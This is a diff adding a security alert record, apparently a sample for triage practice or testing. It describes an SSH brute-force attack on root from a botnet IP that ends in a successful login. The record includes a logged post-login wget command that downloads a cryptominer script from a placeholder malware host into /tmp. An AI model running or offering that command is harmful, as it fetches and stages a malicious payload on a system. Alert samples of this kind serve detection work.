@@ -1,0 +1,19 @@
+Alert Metadata:
+Alert Name: SSH Brute Force with Successful Login
+Severity: Critical
+Timestamp: 2026-07-18T12:00:21Z
+Sensor: Linux Auditd
+
+Raw Log Data:
+Jul 18 12:00:15 srv-web-ext sshd[10201]: Failed password for root from 198.51.100.43 port 49321 ssh2
+Jul 18 12:00:18 srv-web-ext sshd[10205]: Failed password for root from 198.51.100.43 port 49344 ssh2
+Jul 18 12:00:21 srv-web-ext sshd[10211]: Accepted password for root from 198.51.100.43 port 49350 ssh2
+Jul 18 12:00:21 srv-web-ext sshd[10211]: pam_unix(sshd:session): session opened for user root by (uid=0)
+
+Artifact Panel Context:
+
+Authentication History: Prior to the success, 4,302 failed SSH login attempts were logged targeting the 'root' account from 198.51.100.43 in the last 15 minutes.
+
+IP Reputation: 198.51.100.43 is listed on multiple threat intelligence feeds as an active Mirai botnet node.
+
+Post-Login Activity: Process wget [http://malware-hosting.xyz/miner.sh](http://malware-hosting.xyz/miner.sh) -O /tmp/miner.sh executed 2 seconds after successful login.
